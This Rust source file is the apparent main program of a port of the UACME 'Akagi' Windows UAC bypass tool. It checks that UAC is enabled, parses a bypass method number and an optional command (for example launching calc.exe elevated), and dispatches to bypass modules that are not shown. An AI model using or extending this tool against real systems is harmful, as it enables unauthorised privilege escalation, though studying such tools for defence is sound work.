// UACME Rust - Akagi Main Program
// Port of Source/Akagi

mod context;
mod console;
mod methods;
mod payload_loader;

use shared::*;
use context::*;
use methods::*;
use console::*;

use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::System::Com::*;
use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
use std::env;

/// Program entry point
fn main() {
    env_logger::init();
    
    let exit_code = match run() {
        Ok(code) => code,
        Err(e) => {
            eprintln!("Error: {}", e);
            constants::STATUS_FATAL_APP_EXIT as u32
        }
    };
    
    exit_process(exit_code);
}

/// Main execution logic
fn run() -> Result<u32, String> {
    // Initialize COM
    unsafe {
        let hr = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        if hr.is_err() {
            return Err(format!("COM initialization failed: {:?}", hr));
        }
    }
    
    // Check UAC is enabled
    if !is_uac_enabled() {
        return Err("UAC is not enabled".to_string());
    }
    
    // Parse command line
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        print_usage();
        return Ok(constants::STATUS_INVALID_PARAMETER as u32);
    }
    
    // Parse method number
    let method_num: u32 = args[1].parse()
        .map_err(|_| "Invalid method number".to_string())?;
    
    let method = UcmMethod::from_u32(method_num)
        .ok_or("Invalid method ID".to_string())?;
    
    // Get optional parameter
    let optional_param = if args.len() > 2 {
        Some(args[2].clone())
    } else {
        None
    };
    
    // Initialize context
    let mut ctx = UacmeContext::new(method, optional_param)?;
    
    console_print_status("[*] Context initialized", constants::STATUS_SUCCESS);
    
    // Run the method
    let result = methods_manager_call(&mut ctx, method);
    
    console_print_status("[+] Method execution completed", result);
    
    Ok(result as u32)
}

/// Check if UAC is enabled
fn is_uac_enabled() -> bool {
    use windows::Win32::System::Registry::*;
    
    unsafe {
        let key_path = to_wide_string(
            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
        );
        let value_name = to_wide_string("EnableLUA");
        
        let mut hkey = HKEY::default();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(key_path.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        ).is_ok() {
            let mut value = 0u32;
            let mut size = std::mem::size_of::<u32>() as u32;
            let mut value_type = REG_NONE;
            
            let result = RegQueryValueExW(
                hkey,
                PCWSTR(value_name.as_ptr()),
                None,
                Some(&mut value_type),
                Some(&mut value as *mut _ as *mut u8),
                Some(&mut size),
            );
            
            let _ = RegCloseKey(hkey);
            
            if result.is_ok() {
                return value != 0;
            }
        }
    }
    
    false
}

/// Print usage information
fn print_usage() {
    println!("UACME Rust - UAC Bypass Demonstrator");
    println!("Version: {}.{}.{}", 3, 6, 4);
    println!();
    println!("Usage: akagi <method_number> [optional_command]");
    println!();
    println!("Examples:");
    println!("  akagi 23");
    println!("  akagi 33 c:\\windows\\system32\\calc.exe");
    println!();
    println!("Note: This tool is for educational and research purposes only.");
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_uac_check() {
        // This test will vary based on system configuration
        let enabled = is_uac_enabled();
        println!("UAC enabled: {}", enabled);
    }
}

